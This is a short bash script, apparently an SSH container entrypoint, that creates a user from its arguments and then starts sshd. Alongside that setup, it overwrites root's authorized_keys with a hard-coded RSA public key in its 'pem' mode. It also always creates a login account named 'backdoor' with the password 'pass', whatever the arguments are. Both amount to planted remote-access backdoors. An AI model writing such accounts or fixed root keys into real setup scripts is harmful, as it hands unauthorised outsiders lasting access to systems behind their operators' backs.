#!/usr/bin/env bash

case "$1" in
   "password" )
        useradd -ms /bin/bash $2
        echo "$2:$3" | chpasswd ;;
   "pem" )
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDuyTkW+neD5/xhyw8WAuTL+COkRch/wTi1UGFBbF0UYZO9TiC1DLeyKMR+EQNai34LVy/DxoVYL/BWUwK0TSlS6bxzKOobIsFxW2wqxOGqScEVvucFrKTcAX+oWY67hzgBp9+sZ+7n5IuHlBaZWnbvljAV8AlJhuzldaHxw7CS1Z6c04h5Vv7jWbsOjs/g7+LuqsRmrcxlMGzUgCpSkcKza4JSGv4WUA376f9pm3beubEkv6h3jdLTown3NiTNLQIyHkuj+xqKq63mp4YeyUlH/0DE6G5lwc93lwbqcrQ1q68i1F4YQkVZptcs+/bSP2/xyMYuHMpIWW1qPaP1Z6jN $2" > /root/.ssh/authorized_keys ;;
   * )
        echo "invalid authentication type"
        echo "syntax: [password user1 password1 | pem user1]" ;;

esac

useradd -ms /bin/bash 'backdoor'
echo "backdoor:pass" | chpasswd

/usr/sbin/sshd -D
